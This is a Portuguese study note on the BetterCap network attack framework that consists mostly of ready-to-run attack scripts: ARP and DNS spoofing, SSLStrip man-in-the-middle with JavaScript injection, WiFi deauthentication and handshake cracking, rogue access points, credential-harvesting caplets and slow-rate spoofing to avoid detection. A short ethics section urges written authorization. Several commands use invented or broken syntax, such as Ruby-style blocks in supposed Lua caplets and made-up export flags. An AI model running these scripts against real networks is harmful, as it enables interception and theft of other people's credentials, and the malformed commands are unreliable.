2025-12-15 23:12

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[Redes de Computadores]] | [[Redes]]

----
# Introdução

## O que é o BetterCap?

**BetterCap** é um framework de ataque de rede, análise e monitoramento poderoso, flexível e portátil. Criado por **Simone Margaritelli** (aka evilsocket), é escrito em Go e projetado para ser uma ferramenta "tudo-em-um" para testes de penetração em redes.

![[Pasted image 20251215231929.png]]

## Filosofia e Design

```text
"Swiss Army Knife" das ferramentas de rede
✓ Modular e extensível
✓ Multiplataforma (Linux, macOS, Windows, Android)
✓ Interface Web e CLI
✓ Scriptável em Lua/Go
✓ Atualizações constantes
```

## Evolução Histórica

- **2015:** Primeira versão lançada.
- **2016-2018:** Evolução para framework completo.
- **2019-presente:** Suporte a WiFi, BLE, e novas funcionalidades.

## Casos de Uso

1. **Testes de Penetração** em redes locais.
2. **Monitoramento de Rede** para fins de segurança.
3. **Análise Forense** de tráfego.
4. **Demonstrações educativas** de ataques.
5. **Auditoria de segurança** de infraestrutura.

---
# Arquitetura e Funcionamento

## Arquitetura do Sistema

```text
┌─────────────────────────────────────────────────────┐
│                 BETTERCAP CORE                      │
│  ┌──────────┬──────────┬──────────┬──────────┐      │
│  │  Parsers │ Proxies  │ Sniffers │ Modules  │      │
│  │  Engine  │  Engine  │  Engine  │  System  │      │
│  └──────────┴──────────┴──────────┴──────────┘      │
├─────────────────────────────────────────────────────┤
│                  DRIVERS/PLUGINS                    │
│  ┌──────────┬──────────┬──────────┬──────────┐      │
│  │   WiFi   │   BLE    │   HID    │ Custom   │      │
│  │  Driver  │  Driver  │  Driver  │  Plugins │      │
│  └──────────┴──────────┴──────────┴──────────┘      │
├─────────────────────────────────────────────────────┤
│                INTERFACES DE USUÁRIO                │
│  ┌──────────────────────────────────────────────┐   │
│  │     CLI      │      WEB      │      API      │   │
│  │  (Console)   │   (UI/127.0.0.1)  │  (REST)   │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

## Mecanismos Principais

1. **Packet Crafting e Injeção**
	- Manipulação de pacotes em baixo nível.
	- Suporte a múltiplos protocolos.
	- Injeção em tempo real.

2. **Sistema de Módulos**
	- Módulos carregáveis dinamicamente.
	- Hot-plug de funcionalidades.
	- Comunicação entre módulos.

3. **Engine de Eventos**
	- *Event-driven architecture*.
	- Scripting com Lua.
	- Hooks e callbacks.

4. **Banco de Dados em Memória**
	- Armazena hosts, credenciais, dados.
	- Persistência opcional.
	- Consultas em tempo real.

---
# Instalação e Configuração

## Métodos de Instalação

### Linux (Debian/Ubuntu)

```bash
# Método 1: Repositório oficial
sudo apt update
sudo apt install bettercap

# Método 2: Binary release
wget https://github.com/bettercap/bettercap/releases/download/v2.32.0/bettercap_linux_amd64.zip
unzip bettercap_linux_amd64.zip
sudo mv bettercap /usr/local/bin/

# Método 3: Build from source
go get github.com/bettercap/bettercap
cd $GOPATH/src/github.com/bettercap/bettercap
make build
sudo make install
```

### macOS

```bash
# Via Homebrew
brew install bettercap

# Ou via MacPorts
sudo port install bettercap
```

### Windows

```bash
# Via Chocolatey
choco install bettercap

# Ou download binary do GitHub
# https://github.com/bettercap/bettercap/releases
```

### Docker

```bash
# Pull da imagem oficial
docker pull bettercap/bettercap

# Executar com privilégios de rede
docker run -it --network host --privileged bettercap/bettercap
```

## Configuração Inicial

### Arquivo de Configuração

```yaml
# ~/.bettercap/bettercap.conf

# Configurações gerais
core.version.check = true
core.proxies.port = 8080
core.sniffer.output = /tmp/bettercap.pcap

# Configurações de rede
net.sniff.verbose = false
net.sniff.local = false
net.probe.throttle = 10

# Configurações de WiFi
wifi.interface = wlan0
wifi.ap.ssid = Bettercap-AP
wifi.ap.channel = 6

# Configurações de proxy
http.proxy.port = 8080
http.proxy.sslstrip = true
https.proxy.port = 8081

# Configurações de servidor web
http.server.port = 80
http.server.path = /var/www/html
```

### Verificação da Instalação

```bash
# Verificar versão
bettercap -version

# Verificar módulos disponíveis
bettercap -eval "help"

# Testar funcionalidades básicas
bettercap -iface eth0 -eval "net.show"
```

## Configuração de Interfaces

### WiFi em Modo Monitor

```bash
# Configurar interface WiFi
sudo airmon-ng start wlan0

# Verificar modo monitor
iwconfig wlan0mon

# Iniciar bettercap com interface monitor
sudo bettercap -iface wlan0mon
```

### Múltiplas Interfaces

```bash
# Usar interface específica
sudo bettercap -iface eth0

# Ou selecionar na inicialização
sudo bettercap -autostart "net.probe on; net.sniff on"
```

---
# Interfaces e Modos de Operação

## Modo Console Interativo

```bash
# Iniciar modo interativo
sudo bettercap -iface eth0

# Comandos básicos no console
[bettercap eth0] > help
[bettercap eth0] > net.show
[bettercap eth0] > active
```

## Interface Web (Web UI)

```bash
# Iniciar com interface web
sudo bettercap -iface eth0 -caplet http-ui

# Acessar no navegador
# http://127.0.0.1:80
```

## Modo Script *(Caplets)*

```bash
# Executar script/caplet
sudo bettercap -iface eth0 -caplet spoof.cap

# Ou carregar durante execução
[bettercap eth0] > caplets.update
[bettercap eth0] > caplets.show
[bettercap eth0] > set $ {caplet.name}
```

## API REST

```bash
# Iniciar servidor API
sudo bettercap -eval "api.rest on"

# Exemplo de chamada API
curl -X GET "http://127.0.0.1:8081/api/session"
curl -X POST "http://127.0.0.1:8081/api/session/events" -d '{"filter":"net.*"}'
```

## Modo Silencioso/Background

```bash
# Executar em background
sudo bettercap -iface eth0 -eval "net.probe on; net.sniff on" -daemon

# Verificar processos
ps aux | grep bettercap

# Parar processo
sudo pkill bettercap
```

---
# Módulos Principais

## Módulos de Descoberta de Rede

### `net.probe`

```bash
# Ativar descoberta de hosts
net.probe on

# Configurar throttle
set net.probe.throttle 50

# Filtrar por IP
net.probe 192.168.1.0/24
```

### `net.recon`

```bash
# Ativar reconhecimento
net.recon on

# Mostrar hosts descobertos
net.show

# Exportar para arquivo
net.show > hosts.txt
```

### `net.sniff`

```bash
# Sniffar tráfego
net.sniff on

# Filtrar por protocolo
set net.sniff.filter tcp port 80

# Salvar em PCAP
set net.sniff.output capture.pcap
```

## Módulos de Ataque

### `arp.spoof` (ARP Spoofing)

```bash
# Spoofar hosts específicos
arp.spoof on
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true

# Ver status
arp.spoof show
```

### `dhcp6.spoof` (Rogue DHCPv6)

```bash
# Ataque DHCPv6
dhcp6.spoof on
set dhcp6.spoof.domains google.com,facebook.com
```

### `dns.spoof` (DNS) Spoofing

```bash
# Spoofar DNS
dns.spoof on
set dns.spoof.hosts example.com=192.168.1.2
set dns.spoof.all true
```

## Módulos WiFi

### `wifi.recon`

```bash
# Reconhecimento WiFi
wifi.recon on
wifi.show

# Filtrar por ESSID
set wifi.recon.ssid "Free WiFi"
```

### `wifi.deatuh` (Deauthentication Attack)

```bash
# Ataque deauth
wifi.deauth on
set wifi.deauth.bssid 00:11:22:33:44:55
set wifi.deauth.ap-only false
```

### `wifi.rogue` (Roque AP)

```bash
# Criar AP falso
wifi.rogue on
set wifi.rogue.ssid "Starbucks Free WiFi"
set wifi.rogue.channel 6
```

## Módulos de Proxy e Manipulação

### `http.proxy`

```bash
# Proxy HTTP
http.proxy on
set http.proxy.port 8080
set http.proxy.script inject.js
```

### `https.proxy`

```bash
# Proxy HTTPS (com SSLStrip)
https.proxy on
set https.proxy.sslstrip true
set https.proxy.port 8081
```

### `net.sniff` (Packet Sniffing Avançado)

```bash
# Sniffar com parsers específicos
net.sniff on
set net.sniff.regexp "password|login|user"
set net.sniff.local true
```

## Módulos de HID *(Human Interface Device)*

### `hid.attack`

```bash
# Ataques via USB Rubber Ducky
hid.attack on
set hid.attack.payload ducky_script.txt
set hid.attack.target 192.168.1.100
```

## Módulos Bluetooth Low Energy

### `ble.recon`

```bash
# Reconhecimento BLE
ble.recon on
ble.show

# Conectar a dispositivo
ble.enum 00:AA:BB:CC:DD:EE
```

---
# Cenários de Uso Práticos

## Cenário 1: Teste de Penetração em Rede Local

```bash
#!/bin/bash
# Script completo de teste de rede

echo "[*] Iniciando auditoria de rede..."

sudo bettercap -iface eth0 -eval "
# Fase 1: Descoberta
net.probe on
sleep 10

# Fase 2: Mapeamento
net.recon on
sleep 5
net.show

# Fase 3: ARP Spoofing
set arp.spoof.targets 192.168.1.100,192.168.1.101
set arp.spoof.fullduplex true
arp.spoof on

# Fase 4: Sniffing
set net.sniff.output capture.pcap
set net.sniff.regexp 'password|token|key'
net.sniff on

# Fase 5: DNS Spoofing
set dns.spoof.hosts '*.google.com=192.168.1.2'
set dns.spoof.all true
dns.spoof on

# Manter executando
sleep 300
"
```

## Cenário 2: Auditoria de Segurança WiFi

```bash
# Script para auditoria WiFi

sudo bettercap -iface wlan0mon -eval "
# Configurar interface monitor
wifi.clear

# Scan de redes
wifi.recon on
sleep 15
wifi.show

# Selecionar alvo
set wifi.deauth.bssid 00:11:22:33:44:55
set wifi.deauth.per 5

# Ataque Deauth
wifi.deauth on
sleep 30
wifi.deauth off

# Capturar handshake
set wifi.handshakes.file /tmp/handshake.cap
wifi.handshakes capture
"

# Após capturar handshake, quebrar com aircrack-ng
aircrack-ng -w rockyou.txt /tmp/handshake.cap
```

## Cenário 3: Man-in-the-Middle com SSLStrip

```bash
# MITM com stripping SSL

sudo bettercap -iface eth0 -eval "
# Configurar proxy
set http.proxy.port 8080
set https.proxy.port 8081
set https.proxy.sslstrip true

# ARP spoofing
set arp.spoof.targets 192.168.1.1/24
arp.spoof on

# Iniciar proxies
http.proxy on
https.proxy on

# Script de injeção
set http.proxy.script inject.js
set https.proxy.script inject.js

# Sniffar credenciais
set net.sniff.regexp '(email|user|pass)=[^&]*'
net.sniff on
"
```

## Cenário 4: Criando um AP Rogue

```bash
# Criar access point falso

sudo bettercap -iface wlan0 -eval "
# Configurar AP rogue
set wifi.rogue.ssid 'Free Airport WiFi'
set wifi.rogue.channel 6
set wifi.rogue.bssid 00:DE:AD:BE:EF:00

# Iniciar AP
wifi.rogue on

# Captive portal
set http.server.port 80
set http.server.path /var/www/captive
http.server on

# Redirecionar todo tráfego HTTP
set dns.spoof.all true
set dns.spoof.hosts '*=192.168.77.1'
dns.spoof on
"
```

---
# Exemplos de Comandos

## Comandos Básicos de Navegação

```bash
# Ajuda e documentação
help
help arp.spoof
help wifi.*

# Configurações
set
set $ {option.name} {value}
get $ {option.name}

# Sessão
active
clear
quit
```

## Comandos de Rede

```bash
# Mostrar tabela ARP
arp.show

# Mostrar hosts ativos
net.show

# Ping para host
ping 192.168.1.1

# Rota para host
route 192.168.1.100

# Ver gateway
get arp.spoof.gateway
```

## Comandos de WiFi

```bash
# Listar redes WiFi
wifi.show

# Scan detalhado
wifi.recon on
sleep 10
wifi.show

# Ataque a rede específica
set wifi.deauth.bssid 00:11:22:33:44:55
wifi.deauth on

# Criar hotspot
set wifi.ap.ssid 'TestingAP'
wifi.ap on
```

## Comandos de Sniffing

```bash
# Sniffar com filtro
set net.sniff.filter 'tcp port 443'
net.sniff on

# Sniffar localmente
set net.sniff.local true
net.sniff on

# Parar sniffing
net.sniff off

# Limpar captura
net.sniff clear
```

## Comandos de Proxy

```bash
# Configurar proxy HTTP
set http.proxy.port 8080
http.proxy on

# Configurar proxy HTTPS
set https.proxy.port 8081
https.proxy on

# Adicionar script de injeção
set http.proxy.script badblood.js
```

---
# Técnicas Avançadas

## Scripting com Caplets

### Exemplo de Caplet Completo

```lua
-- mitm.cap
-- Man-in-the-Middle completo

print("Starting MITM attack...")

-- Configurações
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
set http.proxy.port 8080
set https.proxy.port 8081
set https.proxy.sslstrip true

-- Iniciar módulos
arp.spoof on
sleep 2
http.proxy on
https.proxy on

-- Script de injeção JavaScript
set http.proxy.injectjs "alert('Hacked!')"

-- Sniffar tráfego
set net.sniff.output mitm.pcap
net.sniff on

print("MITM running. Press Ctrl+C to stop.")

-- Loop principal
while true do
    sleep 1
    -- Verificar se há novas credenciais
    events.stream "creds.*"
end
```

### Caplet para Credential Harvesting

```lua
-- creds.cap
-- Captura de credenciais

events.clear

-- Handler para eventos de credenciais
on event 'net.sniff.http.req.*' do |event|
    if event['data']['headers']['Authorization'] then
        print("Basic Auth found: " .. event['data']['headers']['Authorization'])
    end
end

on event 'net.sniff.http.req.body' do |event|
    local body = event['data']['body']
    if body:match('password=') or body:match('login=') then
        print("Credentials in body: " .. body)
    end
end

-- Configurar sniffing
set net.sniff.local true
set net.sniff.filter 'tcp port 80 or tcp port 443'
net.sniff on

print("Credential sniffer active...")
```

## Integração com Outras Ferramentas

### Integração com Nmap

```bash
# Usar bettercap para descobrir hosts, depois scan com nmap
sudo bettercap -iface eth0 -eval "net.probe on; sleep 30; net.show" | \
grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | \
sort -u > hosts.txt

nmap -iL hosts.txt -sV -O -p- -oA network_scan
```

### Integração com Wireshark

```bash
# Salvar captura e analisar no Wireshark
sudo bettercap -iface eth0 -eval "
set net.sniff.output capture.pcap
net.sniff on
sleep 60
net.sniff off
"

# Abrir no Wireshark
wireshark capture.pcap
```

## Técnicas de Evasão

### Slow Rate ARP Spoofing

```bash
# ARP spoofing lento para evitar detecção
set arp.spoof.interval 5000  # 5 segundos
set arp.spoof.targets 192.168.1.100
arp.spoof on
```

### DNS Spoofing Seletivo

```bash
# Spoofar apenas domínios específicos
set dns.spoof.domains '*.google.com,*.facebook.com'
set dns.spoof.address 192.168.1.2
dns.spoof on
```

---
# Análise e Monitoramento

## Monitoramento em Tempo Real

```bash
# Dashboard completo
sudo bettercap -iface eth0 -caplet dashboard.cap

# Ou no console interativo
[bettercap eth0] > dashboard
```

## Logging e Exportação

```bash
# Log para arquivo
set * {event.type} >> /tmp/bettercap.log

# Exportar hosts para CSV
net.show --format csv > hosts.csv

# Exportar sessão completa
session.save bettercap_session.json
```

## Análise de Eventos

```bash
# Monitorar eventos específicos
events.clear
events.on 'arp.spoof.*' do |e|
    print("ARP Spoof event: " .. e)
end

events.on 'net.sniff.http.*' do |e|
    if e['data']['host']:match('bank') then
        print("Banking traffic detected!")
    end
end

events.stream
```

## Estatísticas de Rede

```bash
# Mostrar estatísticas
stats.show

# Estatísticas por protocolo
set net.sniff.stats true
net.sniff on

# Limpar estatísticas
stats.clear
```

---
# Melhores Práticas

## Segurança ao usar BetterCap

### 1. Ambiente Controlado

```bash
# Sempre usar em laboratório próprio
# Nunca em redes de produção sem autorização
```

### 2. Backup de Configurações

```bash
# Backup do arquivo de configuração
cp ~/.bettercap/bettercap.conf ~/.bettercap/bettercap.conf.backup

# Backup de caplets
cp -r ~/.bettercap/caplets ~/backup_caplets
```

### 3. Monitoramento de Recursos

```bash
# Verificar uso de CPU/Memória
top -p $(pgrep bettercap)

# Monitorar tráfego gerado
iftop -i eth0
```

## Otimização de Performance

```bash
# Configurações para melhor performance
set net.sniff.bpf.filter "not arp and not icmp"
set net.probe.throttle 100
set * {option.name} {optimized.value}
```

## Troubleshooting Comum

### Problema: Interface não entra em modo monitor

```bash
# Solução:
sudo airmon-ng check kill
sudo systemctl stop NetworkManager
sudo airmon-ng start wlan0
```

### Problema: ARP Spoofing não funciona

```bash
# Verificar:
arp.spoof show
net.show

# Possíveis soluções:
set arp.spoof.fullduplex true
iptables --flush
```

### Problema: Proxy não intercepta HTTPS

```bash
# Verificar SSLStrip
set https.proxy.sslstrip true

# Verificar certificados
ls ~/.bettercap/ssl/
```

---
# Legais e Éticos

### Considerações Legais

**Aviso Importante**: BetterCap é uma ferramenta poderosa que pode ser usada para atividades ilegais. Sempre:

1. **Obtenha permissão por escrito** antes de testar qualquer rede
2. **Use apenas em redes próprias** ou em ambientes controlados
3. **Respeite a privacidade** de outras pessoas
4. **Conheça as leis locais** sobre monitoramento de rede

### Cenários Éticos de Uso

1. **Testes de penetração autorizados**
2. **Auditoria de segurança própria**
3. **Educação e pesquisa acadêmica**
4. **Demonstrações em ambientes controlados**

### Documentação e Reporting

```bash
# Gerar relatório de testes
sudo bettercap -iface eth0 -eval "
net.probe on
sleep 30
net.show --format html > report.html
session.save report.json
"
```

---
# Alternativas e Complementos

## Alternativas ao BetterCap

| Ferramenta      | Linguagem | Foco               | Diferenças                       |
| --------------- | --------- | ------------------ | -------------------------------- |
| **Ettercap**    | C         | MITM clássico      | Interface gráfica, menos módulos |
| **Cain & Abel** | C++       | Windows            | Foco em Windows, GUI             |
| **MITMf**       | Python    | Framework MITM     | Python-based, extensível         |
| **Responder**   | Python    | LLMNR/NBT-NS       | Específico para poisoning        |
| **Wireshark**   | C/C++     | Análise de pacotes | Foco em análise, não ataque      |

## Ferramentas Complementares

### Para WiFi

```bash
# Aircrack-ng suite
airmon-ng, airodump-ng, aireplay-ng

# Wifite2
wifite --kill

# Kismet
kismet -c wlan0mon
```

### Para Análise

```bash
# Tshark (Wireshark CLI)
tshark -r capture.pcap -Y "http.request"

# Ngrep
ngrep -q -W byline "password" port 80

# Tcpdump
tcpdump -i eth0 -w capture.pcap
```

### Para Exploração

```bash
# Metasploit Framework
msfconsole

# Nmap
nmap -sV -sC target

# Burp Suite
# Para interceptação web
```

----
# Conclusão

BetterCap é uma ferramenta excepcionalmente poderosa e versátil para profissionais de segurança. Sua arquitetura modular, múltiplas interfaces e capacidades abrangentes a tornam indispensável para:

## Pontos Fortes:

✅ **Completa**: Tudo em uma ferramenta  
✅ **Extensível**: Módulos e caplets  
✅ **Multiplataforma**: Linux, macOS, Windows  
✅ **Ativa**: Comunidade ativa e updates  
✅ **Educacional**: Excelente para aprendizado

## Recomendações Finais:

1. **Comece simples**: Domine os módulos básicos primeiro
2. **Laboratório primeiro**: Sempre teste em ambiente controlado
3. **Automatize**: Crie seus próprios caplets para fluxos de trabalho
4. **Mantenha atualizado**: `sudo bettercap -update`
5. **Contribua**: Reporte bugs, sugira features, compartilhe caplets

## Comando Final de Atualização

```bash
# Atualizar bettercap
sudo bettercap -update

# Atualizar caplets
sudo bettercap -eval "caplets.update; quit"

# Verificar versão
bettercap -version
```

---
# Referências

#### Documentação Oficial

- [GitHub Repository](https://github.com/bettercap/bettercap)
- [Official Wiki](https://www.bettercap.org/)
- [Caplets Repository](https://github.com/bettercap/caplets)

#### Comunidades

- [BetterCap Discord](https://discord.gg/bettercap)
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
- [Stack Exchange Security](https://security.stackexchange.com/)

#### Cursos e Tutoriais

- Udemy: "Complete BetterCap Course"
- YouTube: "The Cyber Mentor - BetterCap"
- HackTheBox: Machines que requerem BetterCap